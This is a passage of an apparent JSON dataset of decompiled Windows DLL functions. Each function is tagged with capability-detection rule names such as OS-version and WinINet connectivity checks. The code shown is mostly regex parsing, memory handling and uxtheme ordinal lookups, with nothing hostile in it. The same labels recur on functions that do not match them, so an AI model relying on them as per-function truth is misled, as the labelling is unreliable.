 uStack112._0_2_ = 0;\n        if (uStack56 < 8) goto code_r0x000180019be5;\n        iVar13 = CONCAT44(uStack76, CONCAT22(uStack80._2_2_, uStack80));\n        iVar7 = iVar13;\n        if (0xfff < uStack56 * 2 + 2) {\n            iVar7 = *(iVar13 + -8);\n            if (0x1f < (iVar13 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uStack56 * 2 + 0x29);\n                goto code_r0x000180019c11;\n            }\n        }\n        fcn.18008fb24(iVar7);\ncode_r0x000180019be5:\n        fcn.18008fb00(_auStack48 ^ auStack184);\n        return;\n    }\n    if (uStack88 < 8) {\ncode_r0x000180019950:\n        uStack108 = puVar5[1];\n        uStack104 = puVar5[2];\n        uStack100 = puVar5[3];\n        uStack112._0_2_ = *puVar5;\n        uStack112._2_2_ = *puVar5 >> 0x10;\n        iStack96 = *(puVar5 + 4);\n        uStack88 = *(puVar5 + 6);\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 6) = 7;\n        *puVar5 = 0;\n        goto code_r0x000180019980;\n    }\n    iVar13 = CONCAT44(uStack108, CONCAT22(uStack112._2_2_, uStack112));\n    iVar7 = iVar13;\n    if ((uStack88 * 2 + 2 < 0x1000) || (iVar7 = *(iVar13 + -8),  (iVar13 - iVar7) - 8U < 0x20)) {\n        fcn.18008fb24(iVar7);\n        goto code_r0x000180019950;\n    }\ncode_r0x000180019c11:\n    fcn.1800b3528();\ncode_r0x000180019c17:\n    fcn.1800b3528();\ncode_r0x000180019c1d:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2448
    },
    "18001a0e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001a0e0(int16_t **arg1, ulong arg2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t **noname_0;\n    \n    *(arg1 + 0x74) = 0;\n    noname_0 = arg1;\n    if (arg2 != 0) {\n        do {\n            uVar2 = *(arg1 + 0xf);\n            if (uVar2 - 0x30 < 10) {\n                iVar4 = uVar2 - 0x30;\n            }\n            else if (uVar2 - 0x61 < 6) {\n                iVar4 = uVar2 - 0x57;\n            }\n            else {\n                if (5 < uVar2 - 0x41) goto code_r0x00018001a1ca;\n                iVar4 = uVar2 - 0x37;\n            }\n            if (iVar4 == -1) {\ncode_r0x00018001a1ca:\n                if (arg2 == 0) {\n                    return;\n                }\n                fcn.180015140(noname_0, 2);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            arg2._0_4_ = arg2 + -1;\n            *(arg1 + 0x74) = *(arg1 + 0x74) * 0x10 + iVar4;\n            piVar5 = *arg1;\n            if (piVar5 != arg1[2]) {\n                if (((*piVar5 == 0x5c) && (piVar1 = piVar5 + 1,  piVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar5 = piVar1;\n                }\n                *arg1 = piVar5 + 1;\n            }\n            noname_0 = arg1;\n            fcn.180015150(arg1);\n        } while (arg2 != 0);\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "18001a1e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18001a1e0(int16_t **arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    char cVar6;\n    uint uVar7;\n    uint64_t uVar8;\n    int16_t **noname_0;\n    int16_t *piVar9;\n    \n    iVar2 = *(arg1 + 0x7c);\n    if (iVar2 == 0x5c) {\n        piVar9 = *arg1;\n        if (piVar9 != arg1[2]) {\n            if (((*piVar9 == 0x5c) && (piVar5 = piVar9 + 1,  piVar5 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*piVar5 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar5 - 0x7bU & 0xfffd) == 0)))))) {\n                piVar9 = piVar5;\n            }\n            *arg1 = piVar9 + 1;\n        }\n        fcn.180015150(arg1);\n        uVar3 = *(arg1 + 0x10);\n        if ((uVar3 >> 0x15 & 1) != 0) {\n            if (((uVar3 >> 0xe & 1) == 0) || (*(arg1 + 0xf) != 0x5c)) {\n                if (((uVar3 >> 0x11 & 1) != 0) && (cVar6 = fcn.1800182e0(arg1),  cVar6 != '\\0')) {\n                    return 2;\n                }\n                noname_0 = arg1;\n                cVar6 = fcn.180018220(arg1);\n                if (cVar6 == '\\0') {\n                    cVar6 = fcn.1800186b0(arg1);\n                    return cVar6 != '\\0';\n                }\n                if (*(arg1 + 0x74) != 0) {\n                    fcn.180015140(noname_0, 2);\n                    pcVar4 = swi(3);\n                    uVar8 = (*pcVar4)();\n                    return uVar8;\n                }\n            }\n            else {\n                piVar9 = *arg1;\n                *(arg1 + 0x74) = 0x5c;\n                if (piVar9 != arg1[2]) {\n                    if (((*piVar9 == 0x5c) && (piVar5 = piVar9 + 1,  piVar5 != arg1[2])) &&\n                       ((((uVar3 & 8) == 0 && (*piVar5 - 0x28U < 2)) ||\n                        (((uVar3 & 0x10) == 0 && ((*piVar5 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar9 = piVar5;\n                    }\n                    *arg1 = piVar9 + 1;\n                }\n                fcn.180015150(arg1);\n            }\n            return 1;\n        }\n        if ((uVar3 >> 0x10 & 1) == 0) {\ncode_r0x00018001a384:\n            if ((uVar3 >> 0xf & 1) == 0) {\ncode_r0x00018001a3fd:\n                *(arg1 + 0x74) = 0x5c;\n                return 1;\n            }\n            if (*(arg1 + 0xf) == 0x61) {\n                uVar7 = 7;\n            }\n            else {\n                if (*(arg1 + 0xf) != 0x62) goto code_r0x00018001a3fd;\n                uVar7 = 8;\n            }\n        }\n        else {\n            iVar1 = *(arg1 + 0xf);\n            if (iVar1 == 0x66) {\n                uVar7 = 0xc;\n            }\n            else if (iVar1 == 0x6e) {\n                uVar7 = 10;\n            }\n            else if (iVar1 == 0x72) {\n                uVar7 = 0xd;\n            }\n            else if (iVar1 == 0x74) {\n                uVar7 = 9;\n            }\n            else {\n                if (iVar1 != 0x76) goto code_r0x00018001a384;\n                uVar7 = 0xb;\n            }\n        }\n        *(arg1 + 0x74) = uVar7;\n        piVar9 = *arg1;\n        if (piVar9 == arg1[2]) goto code_r0x00018001a598;\n        if ((*piVar9 != 0x5c) || (piVar5 = piVar9 + 1,  piVar5 == arg1[2])) goto code_r0x00018001a591;\n        uVar3 = *(arg1 + 0x10);\n        if ((uVar3 & 8) == 0) {\n            iVar1 = *piVar5;\njoined_r0x00018001a575:\n            if (1 < iVar1 - 0x28U) goto joined_r0x00018001a57b;\n        }\n        else {\njoined_r0x00018001a57b:\n            if (((uVar3 & 0x10) != 0) || ((*piVar5 - 0x7bU & 0xfffd) != 0)) goto code_r0x00018001a591;\n        }\n        piVar9 = piVar5;\n    }\n    else {\n        if (iVar2 == 0x5b) {\n            piVar9 = *arg1;\n            if (piVar9 != arg1[2]) {\n                if (((*piVar9 == 0x5c) && (piVar5 = piVar9 + 1,  piVar5 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*piVar5 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar5 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar9 = piVar5;\n                }\n                *arg1 = piVar9 + 1;\n            }\n            fcn.180015150(arg1);\n            uVar3 = *(arg1 + 0x7c);\n            if ((uVar3 < 0x3e) && ((0x2400400000000000U >> (uVar3 & 0x3fU) & 1) != 0)) {\n                piVar9 = *arg1;\n                if (piVar9 != arg1[2]) {\n                    if (((*piVar9 == 0x5c) && (piVar5 = piVar9 + 1,  piVar5 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar5 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar5 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar9 = piVar5;\n                    }\n                    *arg1 = piVar9 + 1;\n                }\n                fcn.180015150(arg1);\n                fcn.18001ba00(arg1, uVar3 & 0xffffffff);\n                return 2;\n            }\n            *(arg1 + 0x74) = 0x5b;\n            return 1;\n        }\n        if ((iVar2 == 0x5d) || (iVar2 == -1)) {\n            return 0;\n        }\n        *(arg1 + 0x74) = *(arg1 + 0xf);\n        piVar9 = *arg1;\n        if (piVar9 == arg1[2]) goto code_r0x00018001a598;\n        if ((*piVar9 == 0x5c) && (piVar5 = piVar9 + 1,  piVar5 != arg1[2])) {\n            uVar3 = *(arg1 + 0x10);\n            if ((uVar3 & 8) == 0) {\n                iVar1 = *piVar5;\n                goto joined_r0x00018001a575;\n            }\n            goto joined_r0x00018001a57b;\n        }\n    }\ncode_r0x00018001a591:\n    *arg1 = piVar9 + 1;\ncode_r0x00018001a598:\n    fcn.180015150(arg1);\n    return 1;\n}\n",
        "token_count": 1985
    },
    "18001a93": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001a930(int64_t *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uchar auStack232 [32];\n    ulong uStack200;\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uint64_t uStack56;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack232;\n    auStack184 = ZEXT816(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    auStack136 = ZEXT816(0);\n    puVar3 = auStack184;\n    fcn.180019da0(puVar3, arg1);\n    auStack152._8_8_ = 0;\n    auStack152 = auStack152 & 0xffffffffffffffff;\n    auStack136 = ZEXT816(0);\n    iVar4 = arg1[5];\n    if (iVar4 != arg1[6]) {\n        iVar6 = arg1[6] - iVar4;\n        auStack152._8_8_ = fcn.18001b980(puVar3, iVar6 >> 4);\n        auStack136._8_8_ = (iVar6 >> 4) * 0x10 + auStack152._8_8_;\n        fcn.1800ade80(auStack152._8_8_, iVar4, iVar6);\n        auStack136 = CONCAT88(auStack136._8_8_, iVar6 + auStack152._8_8_);\n    }\n    if (arg2 != 0) {\ncode_r0x00018001a9e4:\n        fcn.180019e40(arg1, auStack184);\n        cVar2 = fcn.180019100(arg1, *(arg2 + 0x10));\n        if (cVar2 == '\\0') goto code_r0x00018001aa04;\n        if (*(arg1 + 0x19) != '\\0') {\n            auStack120 = ZEXT816(0);\n            auStack104 = ZEXT816(0);\n            auStack88 = ZEXT816(0);\n            auStack72 = ZEXT816(0);\n            puVar3 = auStack120;\n            fcn.180019da0(puVar3, arg1);\n            auStack88 = auStack88 & 0xffffffffffffffff;\n            auStack72 = ZEXT816(0);\n            iVar4 = arg1[5];\n            if (iVar4 != arg1[6]) {\n                iVar7 = arg1[6] - iVar4;\n                iVar6 = fcn.18001b980(puVar3, iVar7 >> 4);\n                auStack88 = CONCAT88(iVar6, auStack88._0_8_);\n                auStack72._8_8_ = (iVar7 >> 4) * 0x10 + iVar6;\n                fcn.1800ade80(iVar6, iVar4, iVar7);\n                auStack72 = CONCAT88(auStack72._8_8_, iVar7 + iVar6);\n            }\n            iVar6 = *arg1 - auStack184._0_8_ >> 1;\n            for (iVar4 = *(arg2 + 0x28); iVar4 != 0; iVar4 = *(iVar4 + 0x28)) {\n                fcn.180019e40(arg1, auStack184);\n                cVar2 = fcn.180019100(arg1, *(iVar4 + 0x10));\n                if (cVar2 != '\\0') {\n                    iVar7 = *arg1 - auStack184._0_8_ >> 1;\n                    if (iVar6 < iVar7) {\n                        fcn.180019e40(auStack120, arg1);\n                        iVar6 = iVar7;\n                    }\n                }\n            }\n            fcn.180019e40(arg1, auStack120);\n            if (auStack88._8_8_ != 0) {\n                uVar5 = auStack72._8_8_ - auStack88._8_8_ & 0xfffffffffffffff0;\n                iVar4 = auStack88._8_8_;\n                if ((uVar5 < 0x1000) || (iVar4 = *(auStack88._8_8_ + -8),  (auStack88._8_8_ - iVar4) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar4);\n                    goto code_r0x00018001abeb;\n                }\ncode_r0x00018001ac36:\n                fcn.1800b3528(iVar4, uVar5 + 0x27);\n                goto code_r0x00018001ac3c;\n            }\ncode_r0x00018001abeb:\n            if (auStack120._8_8_ != 0) {\n                uVar5 = (auStack104._8_8_ - auStack120._8_8_ >> 2) * 4;\n                iVar4 = auStack120._8_8_;\n                if ((0xfff < uVar5) && (iVar4 = *(auStack120._8_8_ + -8),  0x1f < (auStack120._8_8_ - iVar4) - 8U))\n                goto code_r0x00018001ac36;\n                fcn.18008fb24(iVar4);\n            }\n        }\n    }\ncode_r0x00018001aa13:\n    if (auStack152._8_8_ != 0) {\n        iVar4 = auStack152._8_8_;\n        if ((0xfff < (auStack136._8_8_ - auStack152._8_8_ & 0xfffffffffffffff0U)) &&\n           (iVar4 = *(auStack152._8_8_ + -8),  0x1f < (auStack152._8_8_ - iVar4) - 8U)) goto code_r0x00018001ac3c;\n        fcn.18008fb24(iVar4);\n    }\n    if (auStack184._8_8_ != 0) {\n        iVar4 = auStack184._8_8_;\n        if ((0xfff < (auStack168._8_8_ - auStack184._8_8_ & 0xfffffffffffffffcU)) &&\n           (iVar4 = *(auStack184._8_8_ + -8),  0x1f < (auStack184._8_8_ - iVar4) - 8U)) {\ncode_r0x00018001ac3c:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    fcn.18008fb00(uStack56 ^ auStack232);\n    return;\ncode_r0x00018001aa04:\n    arg2 = *(arg2 + 0x28);\n    if (arg2 == 0) goto code_r0x00018001aa13;\n    goto code_r0x00018001a9e4;\n}\n",
        "token_count": 1675
    },
    "18001ac5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001ac50(int64_t *arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int64_t arg1_00;\n    uchar *arg1_01;\n    ulong arg2_01;\n    int32_t *piVar5;\n    int64_t arg3;\n    uchar auStack200 [32];\n    char cStack168;\n    ulong uStack160;\n    int64_t aiStack152 [2];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint64_t uStack72;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack200;\n    cStack168 = noname_2;\n    if (*(arg2 + 0x34) == 1) {\n        fcn.18001bc60(arg1, arg2);\n        goto code_r0x00018001ae3b;\n    }\n    auStack136 = ZEXT816(0);\n    auStack120 = ZEXT816(0);\n    auStack104 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    arg1_01 = auStack136;\n    fcn.180019da0(arg1_01, arg1);\n    auStack104 = auStack104 & 0xffffffffffffffff;\n    auStack88 = ZEXT816(0);\n    arg2_00 = arg1[5];\n    if (arg2_00 != arg1[6]) {\n        arg3 = arg1[6] - arg2_00;\n        arg1_00 = fcn.18001b980(arg1_01, arg3 >> 4);\n        auStack104 = CONCAT88(arg1_00, auStack104._0_8_);\n        auStack88._8_8_ = (arg3 >> 4) * 0x10 + arg1_00;\n        fcn.1800ade80(arg1_00, arg2_00, arg3);\n        auStack88 = CONCAT88(auStack88._8_8_, arg3 + arg1_00);\n    }\n    piVar5 = *(arg2 + 0x30) * 0x10 + arg1[0x10];\n    iVar1 = *piVar5;\n    piVar2 = *(piVar5 + 2);\n    aiStack152[0] = *arg1;\n    if ((arg4 == 0) || (*piVar2 != aiStack152[0])) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((*(arg2 + 0x24) < 0) || (arg4 < *(arg2 + 0x24))) {\n        if (arg4 < *(arg2 + 0x20)) {\n            if (!bVar3) goto code_r0x00018001ae01;\ncode_r0x00018001adab:\n            *piVar5 = arg4 + 1;\n            *(piVar5 + 2) = aiStack152;\n            arg2_01 = *(arg2 + 0x10);\n            goto code_r0x00018001ae09;\n        }\n        if (cStack168 != '\\0') {\n            if (bVar3) {\n                *piVar5 = arg4 + 1;\n                *(piVar5 + 2) = aiStack152;\n                cVar4 = fcn.180019100(arg1, *(arg2 + 0x10));\n                if (cVar4 != '\\0') goto code_r0x00018001ae26;\n            }\n            else if (1 < arg4) goto code_r0x00018001ae19;\n            *piVar5 = iVar1;\n            *(piVar5 + 2) = piVar2;\n            fcn.180019e40(arg1, auStack136);\n            goto code_r0x00018001ae01;\n        }\n        cVar4 = fcn.180019100(arg1, *(*(arg2 + 0x28) + 0x10));\n        if (cVar4 == '\\0') {\n            if (bVar3) {\n                fcn.180019e40(arg1, auStack136);\n                goto code_r0x00018001adab;\n            }\n            goto code_r0x00018001ae19;\n        }\n    }\n    else {\ncode_r0x00018001ae01:\n        arg2_01 = *(*(arg2 + 0x28) + 0x10);\ncode_r0x00018001ae09:\n        cVar4 = fcn.180019100(arg1, arg2_01);\n        if (cVar4 == '\\0') {\ncode_r0x00018001ae19:\n            fcn.180019e40(arg1, auStack136);\n        }\n    }\ncode_r0x00018001ae26:\n    *piVar5 = iVar1;\n    *(piVar5 + 2) = piVar2;\n    fcn.1800161d0(auStack136);\ncode_r0x00018001ae3b:\n    fcn.18008fb00(uStack72 ^ auStack200);\n    return;\n}\n",
        "token_count": 1200
    },
    "18001b12": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.18001b120(uint16_t **arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    uint64_t uVar4;\n    uint8_t uVar5;\n    \n    uVar2 = *(arg1 + 0xbc);\n    uVar4 = uVar2;\n    if (((uVar2 >> 8 & 1) == 0) && (puVar3 = *arg1,  puVar3 == arg1[0x13])) {\n        if (puVar3 == arg1[0x14]) {\n            return uVar2 & 0xffffff00 | (uVar2 & 0xc) == 0;\n        }\n        if ((uVar2 & 4) != 0) goto code_r0x00018001b17c;\n        uVar1 = *puVar3;\n    }\n    else {\n        puVar3 = *arg1;\n        if (puVar3 != arg1[0x14]) {\n            if ((puVar3[-1] < 0x7b) && (*(puVar3[-1] + 0x1800ff8f0) != '\\0')) {\n                uVar5 = 1;\n            }\n            else {\n                uVar5 = 0;\n            }\n            uVar1 = *puVar3;\n            uVar4 = uVar1;\n            if ((uVar1 < 0x7b) && (uVar4 = uVar1,  *(uVar4 + 0x1800ff8f0) != '\\0')) {\n                return uVar5 ^ 1;\n            }\n            return uVar4 & 0xffffffffffffff00 | uVar5;\n        }\n        if ((uVar2 & 8) != 0) goto code_r0x00018001b17c;\n        uVar1 = puVar3[-1];\n    }\n    uVar4 = uVar1;\n    if ((uVar1 < 0x7b) && (uVar4 = uVar4 & 0xff,  *(uVar4 + 0x1800ff8f0) != '\\0')) {\n        return 1;\n    }\ncode_r0x00018001b17c:\n    return uVar4 & 0xffffffffffffff00;\n}\n",
        "token_count": 511
    },
    "18001bc6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_bp_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001bc60(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    bool bVar3;\n    char cVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    char in_R8B;\n    int64_t iVar8;\n    bool bVar9;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack264 [32];\n    uchar uStack232;\n    char cStack231;\n    int64_t iStack224;\n    ulong uStack216;\n    uchar auStack200 [16];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [7];\n    int64_t var_79h;\n    uchar auStack120 [7];\n    int64_t var_69h;\n    ulong var_61h;\n    uint64_t var_59h;\n    ulong var_51h;\n    int64_t var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_bp_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    uStack216 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack264;\n    *0xb8 = 0;\n    auStack200 = ZEXT816(0);\n    auStack184 = ZEXT816(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    puVar5 = auStack200;\n    cStack231 = in_R8B;\n    fcn.180019da0(puVar5, arg1);\n    auStack168 = auStack168 & 0xffffffffffffffff;\n    auStack152 = ZEXT816(0);\n    iStack224 = arg1[5];\n    auStack168._8_8_ = *0xb8;\n    if (iStack224 != arg1[6]) {\n        iVar8 = arg1[6] - iStack224;\n        auStack168._8_8_ = fcn.18001b980(puVar5, iVar8 >> 4);\n        auStack152._8_8_ = (iVar8 >> 4) * 0x10 + auStack168._8_8_;\n        fcn.1800ade80(auStack168._8_8_, iStack224, iVar8);\n        auStack152 = CONCAT88(auStack152._8_8_, iVar8 + auStack168._8_8_);\n    }\n    uVar7 = *0xb8;\n    if (0 < *(arg2 + 0x20)) {\n        iVar8 = *arg1;\n        do {\n            iVar6 = uVar7;\n            cVar4 = fcn.180019100(arg1, *(arg2 + 0x10));\n            if (cVar4 == '\\0') {\n                fcn.180019e40(arg1, auStack200);\n                goto code_r0x00018001bf51;\n            }\n            if (iVar8 == *arg1) {\n                iVar6 = *(arg2 + 0x20) + -1;\n            }\n            uVar7 = iVar6 + 1U;\n            iVar8 = *arg1;\n        } while (iVar6 + 1U < *(arg2 + 0x20));\n    }\n    _auStack136 = ZEXT816(0);\n    _auStack120 = ZEXT816(0);\n    unique0x100001cb = ZEXT816(0);\n    unique0x100001ef = ZEXT816(0);\n    puVar5 = auStack136;\n    fcn.180019da0(puVar5, arg1);\n    stack0xffffffffffffff98 = stack0xffffffffffffff98 & 0xffffffffffffffff;\n    unique0x10000213 = ZEXT816(0);\n    iStack224 = arg1[5];\n    if (iStack224 != arg1[6]) {\n        iVar8 = arg1[6] - iStack224;\n        *NULL = fcn.18001b980(puVar5, iVar8 >> 4);\n        *0x18 = (iVar8 >> 4) * 0x10 + *NULL;\n        fcn.1800ade80(*NULL, iStack224, iVar8);\n        stack0xffffffffffffffa8 = CONCAT88(stack0xffffffffffffffb0, iVar8 + *NULL);\n    }\n    uStack232 = 0;\n    iVar8 = *arg1;\n    cVar4 = fcn.180019100(arg1, *(*(arg2 + 0x28) + 0x10));\n    if (cVar4 == '\\0') {\n        bVar3 = false;\ncode_r0x00018001be30:\n        do {\n            if ((*(arg2 + 0x24) != -1) && (iVar6 = uVar7,  uVar7 = iVar6 + 1,  *(arg2 + 0x24) <= iVar6)) break;\n            *arg1 = iVar8;\n            fcn.180019f70(arg1 + 1, auStack200 + 8);\n            cVar4 = fcn.180019100(arg1, *(arg2 + 0x10));\n            if (cVar4 == '\\0') break;\n            iVar1 = *arg1;\n            cVar4 = fcn.180019100(arg1, *(*(arg2 + 0x28) + 0x10));\n            if (cVar4 != '\\0') {\n                if (cStack231 == '\\0') {\n                    goto code_r0x00018001becd;\n                }\n                fcn.180019e40(auStack136, arg1);\n                bVar3 = true;\n                uStack232 = 1;\n            }\n            bVar9 = iVar8 != iVar1;\n            iVar8 = iVar1;\n        } while (bVar9);\n        puVar5 = auStack136;\n        if (!bVar3) {\n            puVar5 = auStack200;\n        }\n        fcn.180019e40(arg1, puVar5);\n    }\n    else if (cStack231 != '\\0') {\n        fcn.180019e40(auStack136, arg1);\n        bVar3 = true;\n        uStack232 = 1;\n        goto code_r0x00018001be30;\n    }\ncode_r0x00018001becd:\n    if (*0xb8 != 0) {\n        uVar7 = *0xb8;\n        if ((0xfff < (stack0xffffffffffffffb0 - *0xb8 & 0xfffffffffffffff0)) &&\n           (uVar7 = *(*0xb8 - 8),  0x1f < (*0xb8 - uVar7) - 8)) goto code_r0x00018001bff4;\n        fcn.18008fb24(uVar7);\n    }\n    if (stack0xffffffffffffff80 != 0) {\n        iVar8 = stack0xffffffffffffff80;\n        if ((0xfff < (stack0xffffffffffffff90 - stack0xffffffffffffff80 >> 2) * 4) &&\n           (iVar8 = *(stack0xffffffffffffff80 + -8),  0x1f < (stack0xffffffffffffff80 - iVar8) - 8U))\n        goto code_r0x00018001bff4;\n        fcn.18008fb24(iVar8);\n    }\ncode_r0x00018001bf51:\n    if (auStack168._8_8_ == 0) {\ncode_r0x00018001bf8a:\n        if (auStack200._8_8_ == 0) {\ncode_r0x00018001bfc4:\n            fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack264);\n            return;\n        }\n        iVar8 = auStack200._8_8_;\n        if (((auStack184._8_8_ - auStack200._8_8_ & 0xfffffffffffffffcU) < 0x1000) ||\n           (iVar8 = *(auStack200._8_8_ + -8),  (auStack200._8_8_ - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            goto code_r0x00018001bfc4;\n        }\n    }\n    else {\n        uVar7 = auStack168._8_8_;\n        if (((auStack152._8_8_ - auStack168._8_8_ & 0xfffffffffffffff0) < 0x1000) ||\n           (uVar7 = *(auStack168._8_8_ - 8),  (auStack168._8_8_ - uVar7) - 8 < 0x20)) {\n            fcn.18008fb24(uVar7);\n            goto code_r0x00018001bf8a;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018001bff4:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2179
    },
    "18001cba": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18001cba0(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    code *pcVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    ulong *puVar9;\n    uchar auStack72 [32];\n    uint uStack40;\n    int32_t iStack36;\n    int32_t aiStack32 [2];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    fcn.18001c980();\n    iVar5 = (**0x1800de450)(0x1800f4988);\n    if ((iVar5 != 0) && (pcVar6 = (**0x1800de458)(iVar5, \"RtlGetNtVersionNumbers\"),  pcVar6 != NULL)) {\n        (*pcVar6)(&iStack36, aiStack32, 0x18012a1f8);\n        *0x18012a1f8 = *0x18012a1f8 & 0xfffffff;\n        if (((iStack36 == 10) && (aiStack32[0] == 0)) &&\n           ((((*0x18012a1f8 == 0x4563 || (*0x18012a1f8 - 0x47ba < 2)) || (0x4a60 < *0x18012a1f8)) &&\n            (iVar5 = (**0x1800de448)(L\"uxtheme.dll\", 0, 0x800),  iVar5 != 0)))) {\n            *0x18012a1c0 = (**0x1800de458)(iVar5, 0x31);\n            *0x18012a1d0 = (**0x1800de458)(iVar5, 0x68);\n            (**0x1800de458)(iVar5, 0x6a);\n            *0x18012a208 = (**0x1800de458)(iVar5, 0x84);\n            *0x18012a1d8 = (**0x1800de458)(iVar5, 0x85);\n            pcVar6 = (**0x1800de458)(iVar5, 0x87);\n            if (*0x18012a1f8 < 0x47ba) {\n                *0x18012a1f0 = pcVar6;\n                pcVar6 = *0x18012a210;\n            }\n            *0x18012a210 = pcVar6;\n            *0x18012a1c8 = (**0x1800de458)(iVar5, 0x88);\n            *0x18012a1e0 = (**0x1800de458)(iVar5, 0x89);\n            iVar5 = (**0x1800de450)(L\"user32.dll\");\n            if (iVar5 